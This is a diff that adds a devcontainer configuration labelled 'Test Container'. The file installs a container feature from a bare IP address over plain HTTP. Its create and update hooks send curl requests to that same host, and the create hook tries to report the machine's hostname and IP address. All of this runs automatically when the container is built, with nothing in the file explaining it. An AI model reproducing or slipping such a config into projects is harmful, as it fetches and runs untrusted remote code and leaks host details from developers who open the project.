@@ -1,0 +1,10 @@
+{
+  "name": "Test Container",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "http://44.211.128.59:8765/codespaces-feature": {}
+  },
+  "onCreateCommand": "curl -s 'http://44.211.128.59:8765/codespaces-oncreate?host=$(hostname)&ip=$(hostname -I)'",
+  "updateContentCommand": "curl -s 'http://44.211.128.59:8765/codespaces-update'",
+  "postCreateCommand": "echo 'Codespace ready'"
+}
